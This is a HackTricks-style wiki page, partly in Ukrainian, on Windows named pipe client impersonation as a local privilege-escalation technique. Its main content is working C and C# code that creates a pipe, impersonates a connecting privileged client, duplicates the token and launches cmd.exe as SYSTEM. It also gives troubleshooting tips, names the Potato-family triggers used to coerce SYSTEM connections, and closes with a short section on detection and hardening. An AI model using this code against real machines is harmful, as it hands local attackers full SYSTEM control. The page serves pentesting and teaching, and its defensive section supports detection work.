# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation — це примітив локального підвищення привілеїв, який дозволяє потоку сервера іменованого каналу прийняти контекст безпеки клієнта, що підключається до нього. На практиці нападник, який може виконувати код з правом SeImpersonatePrivilege, може змусити привілейований клієнт (наприклад, службу SYSTEM) підключитися до керованого нападником каналу, викликати ImpersonateNamedPipeClient, дублювати отриманий токен у первинний токен і запустити процес від імені клієнта (часто NT AUTHORITY\SYSTEM).

This page focuses on the core technique. For end-to-end exploit chains that coerce SYSTEM to your pipe, see the Potato family pages referenced below.

## TL;DR
- Create a named pipe: \\.\pipe\<random> and wait for a connection.
- Make a privileged component connect to it (spooler/DCOM/EFSRPC/etc.).
- Read at least one message from the pipe, then call ImpersonateNamedPipeClient.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary), and CreateProcessWithTokenW/CreateProcessAsUser to get a SYSTEM process.

## Requirements and key APIs
- Privileges typically needed by the calling process/thread:
- SeImpersonatePrivilege to successfully impersonate a connecting client and to use CreateProcessWithTokenW.
- Alternatively, after impersonating SYSTEM, you can use CreateProcessAsUser, which may require SeAssignPrimaryTokenPrivilege and SeIncreaseQuotaPrivilege (these are satisfied when you’re impersonating SYSTEM).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (потрібно прочитати принаймні одне повідомлення перед імперсонацією)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: to perform useful actions locally, the client must allow SecurityImpersonation (default for many local RPC/named-pipe clients). Clients can lower this with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION when opening the pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Примітки:
- Якщо ImpersonateNamedPipeClient повертає ERROR_CANNOT_IMPERSONATE (1368), переконайтеся, що ви спочатку читаєте з pipe і що клієнт не обмежив impersonation до рівня Identification.
- Надавайте перевагу DuplicateTokenEx з SecurityImpersonation і TokenPrimary, щоб створити primary token, придатний для створення процесу.

## .NET швидкий приклад
У .NET NamedPipeServerStream може impersonate через RunAsClient. Після impersonation дублюйте thread token і створіть процес.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Поширені тригери/примуси, щоб отримати SYSTEM на ваш pipe
Ці техніки змушують привілейовані сервіси підключатися до вашого named pipe, щоб ви могли impersonate їх:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Детальне використання та сумісність див. тут:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Якщо вам потрібен повний приклад створення pipe та impersonating, щоб spawn SYSTEM із service trigger, див.:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Усунення неполадок і підводні камені
- Ви повинні прочитати принаймні одне повідомлення з pipe перед викликом ImpersonateNamedPipeClient; інакше ви отримаєте ERROR_CANNOT_IMPERSONATE (1368).
- Якщо клієнт підключається з SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, сервер не може повністю impersonate; перевірте рівень impersonation токена через GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW вимагає SeImpersonatePrivilege у виклику. Якщо це завершується ERROR_PRIVILEGE_NOT_HELD (1314), використовуйте CreateProcessAsUser після того, як ви вже impersonated SYSTEM.
- Переконайтеся, що security descriptor вашого pipe дозволяє цільовому сервісу підключатися, якщо ви його жорстко налаштовуєте; за замовчуванням pipe під \\.\pipe доступні згідно DACL сервера.

## Виявлення та захист
- Моніторьте створення та підключення named pipe. Sysmon Event IDs 17 (Pipe Created) і 18 (Pipe Connected) корисні для базування легітимних імен pipe і виявлення незвичних, випадкових pipe перед подіями маніпуляції токенами.
- Шукайте послідовності: процес створює pipe, сервіс під привілеєм SYSTEM підключається, після чого процес-ініціатор породжує дочірній процес як SYSTEM.
- Зменште експозицію, видаливши SeImpersonatePrivilege з непотрібних сервісних акаунтів і уникаючи непотрібних входів сервісів з високими привілеями.
- Захищена розробка: при підключенні до ненадійних named pipe вказуйте SECURITY_SQOS_PRESENT з SECURITY_IDENTIFICATION, щоб запобігти повному impersonation сервера клієнта, якщо це не потрібно.

## Посилання
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
